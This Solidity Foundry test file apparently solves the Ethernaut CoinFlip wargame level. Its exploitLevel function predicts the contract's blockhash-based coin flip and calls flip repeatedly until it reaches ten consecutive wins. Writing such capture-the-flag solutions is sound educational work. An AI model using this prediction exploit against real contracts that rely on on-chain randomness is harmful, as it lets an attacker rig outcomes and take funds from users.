// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "../src/levels/CoinFlip.sol";
import "../src/levels/CoinFlipFactory.sol";
import "./utils/BaseTest.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";

contract TestCoinflip is BaseTest{
    using SafeMath for uint256;
    CoinFlip level;


    constructor() public{
        levelFactory = new CoinFlipFactory();
    }

    function setUp() public override{
        super.setUp();
    }
    function testRunLevel() public{
        runLevel();
    }
   function setupLevel() internal override{
        levelAddress = payable(this.createLevelInstance(true));
        level = CoinFlip(levelAddress);
                
        assertEq(level.consecutiveWins(), 0);

    }

    function exploitLevel() internal override{
        vm.startPrank(player);
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint8 consecutiveWins = 10;

        while(level.consecutiveWins() < consecutiveWins){
            uint256 blockValue = uint256(blockhash(block.number.sub(1)));
            uint256 coinflip = blockValue.div(FACTOR);
            level.flip(coinflip == 1 ? true:false);

            utilities.mineBlocks(1);
        }
        vm.stopPrank();
    }
}